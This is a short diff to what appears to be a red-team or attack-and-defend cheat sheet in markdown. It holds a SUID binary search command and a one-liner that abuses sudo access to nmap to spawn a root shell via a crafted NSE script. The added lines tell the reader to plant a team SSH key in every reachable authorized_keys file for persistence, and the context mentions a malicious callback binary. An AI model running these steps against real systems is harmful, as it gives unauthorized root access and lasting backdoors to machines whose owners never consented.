@@ -118,6 +118,9 @@ Adding a malicious bin (callback would be good) file to be called during the use
 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>find / perm -u=s -type f 2>/dev/null</code>
 
+### Add private key to authorized keys file
+Create a team ssh key and drop it into any authorzied_keys files you can in user directories under .ssh
+
 ### Privesc for nmap if allowed by sudo
 &nbsp;&nbsp;&nbsp;&nbsp;<code>echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse</code>
 
